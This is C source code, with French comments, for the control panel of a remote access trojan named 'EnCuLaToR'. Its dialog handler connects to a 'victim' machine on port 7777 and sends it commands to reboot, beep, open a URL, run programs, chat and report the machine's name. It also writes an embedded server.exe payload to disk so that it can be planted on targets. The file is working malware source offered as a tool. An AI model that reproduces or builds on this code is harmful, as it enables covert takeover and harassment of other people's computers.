


// GESTIONNAIRE DE LA BOITE DE DIALOGUE PRINCIPALE:
//---------------------------------------------------


LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)  
{
	switch(msg)
	{
	case WM_COMMAND: 
		{                                                       
			switch(LOWORD(wParam))
			{
				case IDC_CONNECT:
					{
						GetDlgItemText(hwnd,IDC_IP,ip,20);
						//port = GetDlgItemInt(hwnd,IDC_PORT,NULL,FALSE);
						closesocket(s);
						connection(ip,7777,hwnd);
						break;
					}

				case IDC_REBOOT:
					{
						if(send(s,message,sizeof(message),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						break;
					}
				case IDC_OPEN:
					{
						if(send(s,open,sizeof(open),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						break;
					}
				case IDC_CLOSE:
					{
						if(send(s,close,sizeof(close),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						break;
					}
				case IDC_BEEP:
					{
						if(send(s,beep,sizeof(beep),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						break;
					}
				case IDC_CHAT:
					{
						DialogBox(hInst,MAKEINTRESOURCE(IDD_DIALOG2),NULL,(DLGPROC) DlgProc2);
						break;
					}

				case IDC_URL:
					{
						DialogBox(hInst,MAKEINTRESOURCE(IDD_DIALOG3),NULL,(DLGPROC) DlgProc3);
						break;
					}

				case IDC_PROG:
					{
						DialogBox(hInst,MAKEINTRESOURCE(IDD_DIALOG4),NULL,(DLGPROC) DlgProc4);
						break;
					}

				case IDC_PARLE:
					{
						if(send(s,parle,sizeof(parle),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						SetDlgItemText(hwnd,IDC_STATUS,"Attente de la r�ponse...");
						recv(s,buf,sizeof(buf),0);
						MessageBox(hwnd,buf,"Reponse:",MB_OK);
						SetDlgItemText(hwnd,IDC_STATUS,"Connect� !!!");

						break;
					}

				case IDC_NOM:
					{
						if(send(s,nom,sizeof(nom),0)==-1)
							SetDlgItemText(hwnd,IDC_STATUS,noco);
						recv(s,buf,sizeof(buf),0);
						MessageBox(hwnd,buf,"Le nom de la b�canne victime est:",MB_OK);

						break;
					}

				case IDC_ABOUT:
					{
						MessageBox(NULL,aboutmsg,"A propos d' EnCuLaToR",MB_OK);
						break;
					}

				case IDC_GEN:
					{
						FILE *fichier;
						fichier = fopen ("C:\\WINDOWS\\bureau\\server.exe" , "wb");
						int f=0;
						if(fichier)
						{
							while (f!=36864)
							{
								fputc(ServerDump[f], fichier);
								f++;
							}
							fclose(fichier);
							MessageBox(NULL,"Server copi� sur le bureau","EnCuLaToR",MB_ICONEXCLAMATION);
						}
						else
						{
							MessageBox(NULL,"Impossible de cr�er le fichier\n"
							"BUG : CAUSE : JE t'aime pas!","EnCuLaToR",NULL);
						}

						break;
					}

				case WM_DESTROY:
					{
						closesocket(s);
						WSACleanup();
						ExitProcess(0);
						break;
					}

			}
			break;
		}


	case WM_INITDIALOG:
		{
			SetDlgItemText(hwnd,IDC_STATUS,"EnCuLaToR");
			SetDlgItemText(hwnd,IDC_IP,"127.0.0.1");
			SetDlgItemText(hwnd,IDC_TEXTE,hello);
			break;
		}

	case WM_CTLCOLOREDIT:
		{
			hdc = (HDC) wParam;
			SetBkColor(hdc,macolor);
			SetTextColor(hdc,blanc);
			return (long) CreateSolidBrush(macolor);
		}

	case WM_CTLCOLORDLG:
		{
			return (long) CreateSolidBrush(noir);
		}
	case WM_CTLCOLORSTATIC:
		{
			hdc = (HDC) wParam;
			SetTextColor(hdc,macolor4);
			SetBkColor(hdc,macolor3);
			return (long) CreateSolidBrush(macolor3);
		}

		default: 	
		return FALSE;
     }
     return TRUE; 
}
